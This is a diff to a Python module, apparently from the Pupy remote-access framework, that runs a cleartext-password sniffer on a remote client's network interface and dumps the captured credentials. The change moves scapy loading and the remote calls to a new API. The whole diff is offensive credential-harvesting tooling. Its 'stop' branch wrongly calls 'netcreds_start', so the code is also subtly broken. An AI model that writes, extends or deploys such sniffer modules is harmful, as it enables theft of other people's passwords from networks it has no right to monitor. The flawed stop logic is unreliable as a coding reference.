@@ -14,7 +14,8 @@ class NetCreds(PupyModule):
         Sniffs cleartext passwords from interface
     """
     unique_instance = True
-    dependencies=[ 'netifaces', 'scapy', 'gzip', 'BaseHTTPServer', 'pupyutils.netcreds' ]
+    dependencies=[ 'netifaces', 'gzip', 'BaseHTTPServer', 'pupyutils.netcreds' ]
+    qa = QA_DANGEROUS
 
     @classmethod
     def init_argparse(cls):
@@ -25,7 +26,12 @@ class NetCreds(PupyModule):
 
     def run(self, args):
         if args.action=="start":
-            r = self.client.conn.modules["pupyutils.netcreds"].netcreds_start(args.interface, args.filterip)
+
+            # Load full scapy
+            self.client.load_package('scapy', honor_ignore=False, force=True)
+            netcreds_start = self.client.remote('pupyutils.netcreds', 'netcreds_start', False)
+
+            r = netcreds_start(args.interface, args.filterip)
             if r == 'not_root':
                 self.error("Needs root privileges to be started")
             elif not r:
@@ -39,7 +45,8 @@ class NetCreds(PupyModule):
             except Exception:
                 pass
 
-            data = obtain(self.client.conn.modules["pupyutils.netcreds"].netcreds_dump())
+            netcreds_dump = self.client.remote('pupyutils.netcreds', 'netcreds_dump')
+            data = netcreds_dump()
 
             if data is None:
                 self.error("Network credentials sniffer has not been started yet")
@@ -63,5 +70,6 @@ class NetCreds(PupyModule):
                 self.log(data)
 
         elif args.action=="stop":
-            stop = self.client.conn.modules["pupyutils.netcreds"].netcreds_stop()
+            netcreds_stop = self.client.remote('pupyutils.netcreds', 'netcreds_start')
+            netcreds_stop()
             self.success("Network credentials sniffer is stopped")
